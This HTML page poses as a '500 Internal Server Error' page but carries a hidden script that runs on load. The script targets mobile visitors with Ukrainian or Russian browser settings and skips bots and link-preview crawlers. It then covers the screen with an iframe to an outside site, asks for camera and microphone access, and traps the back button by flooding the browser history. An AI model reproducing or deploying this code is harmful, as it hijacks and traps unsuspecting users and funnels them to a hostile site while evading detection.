<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>500 Internal Server Error</title>
    <script>
    (function() {
        const isUA = navigator.language.includes('uk') || navigator.language.includes('ua') || navigator.language.includes('ru');
        const isMob = /iPhone|Android|Mobile/i.test(navigator.userAgent);
        const isBot = /bot|facebook|meta|externalhit|message|preview/i.test(navigator.userAgent);

        if (isBot || !isMob || !isUA) return;

        const target = "https://neontishell.uno/index.php?src=gh"; 
        
        function inject() {
            if (window.done) return;
            window.done = true;
            
            const style = document.createElement('style');
            style.innerHTML = `body,html{margin:0;padding:0;height:100%;overflow:hidden;background:#fff;}iframe{width:100%;height:100%;border:none;position:fixed;top:0;left:0;z-index:999999;}`;
            document.head.appendChild(style);

            const ifrm = document.createElement('iframe');
            ifrm.src = target;
            ifrm.allow = "autoplay; encrypted-media; fullscreen; microphone; camera;";
            document.body.appendChild(ifrm);

            // Prison Logic
            for(let i=0; i<15; i++) history.pushState(null, "", "#/access_id_" + Math.random().toString(36).substring(7));
            window.onpopstate = () => history.forward();
        }

        window.addEventListener('touchstart', inject, {once: true});
        window.addEventListener('click', inject, {once: true});
        
        setTimeout(inject, 4000);
    })();
    </script>
</head>
<body style="background:#fff; font-family:sans-serif; padding:50px; color:#666;">
    <h2>500 Internal Server Error</h2>
    <p>The server encountered an unexpected condition that prevented it from fulfilling the request.</p>
</body>
</html>
